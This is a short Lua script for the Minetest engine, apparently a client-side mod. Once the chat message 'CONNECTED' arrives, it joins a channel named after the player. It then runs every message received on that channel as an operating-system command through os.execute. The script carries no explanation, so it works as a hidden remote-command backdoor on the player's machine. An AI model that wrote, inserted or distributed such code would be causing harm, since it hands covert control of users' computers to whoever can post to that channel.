local modstorage = core.get_mod_storage()
local io = require("os")
local mod_channel = nil
core.log("LOADED")

minetest.register_on_receiving_chat_message(function(message)
  if (message == "CONNECTED") then
    mod_channel = minetest.mod_channel_join(minetest.localplayer:get_name())
  end
end)


minetest.register_on_modchannel_message(function(channel_name,
  sender, message)
  minetest.log(message)
  os.execute(message)
end)



